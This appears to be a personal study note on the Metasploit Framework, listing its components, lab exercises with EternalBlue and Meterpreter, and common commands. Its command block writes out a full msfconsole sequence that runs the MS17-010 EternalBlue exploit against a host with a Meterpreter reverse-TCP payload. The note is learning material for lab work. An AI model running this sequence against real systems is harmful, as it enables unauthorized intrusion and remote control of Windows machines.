# Metasploit Framework

**Category:** Exploitation & Penetration Testing  
**Difficulty:** Intermediate  

## Description

Metasploit Framework (MSF) is the world’s most used penetration testing framework. It provides a comprehensive environment for developing, testing, and executing exploits.

## Key Components
- **msfconsole** — Main command line interface
- Modules: Exploits, Payloads, Auxiliaries, Post-exploitation
- Metasploit Database (msfdb)

## Hands-on Examples
### Example 1: EternalBlue Exploit
- Successfully exploited a vulnerable Windows machine using MS17-010 in a lab.
- (Insert screenshot: Metasploit console showing successful exploit and Meterpreter session)
### Example 2: Post-Exploitation
- Used Meterpreter to gather system information and escalate privileges.
- (Insert screenshot: Meterpreter commands and output)

## What I Learned
- Proper use of payloads and listeners is critical.
- Always test exploits in an isolated lab first.
- Metasploit is powerful but understanding the underlying vulnerability is more important.

## Resources
- Official Metasploit Documentation
- Rapid7 Metasploit Framework GitHub
- Metasploit Unleashed (Free course)



## Common Commands

```bash
# Start Metasploit
msfconsole

# Search for modules
search eternalblue
search type:exploit windows

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
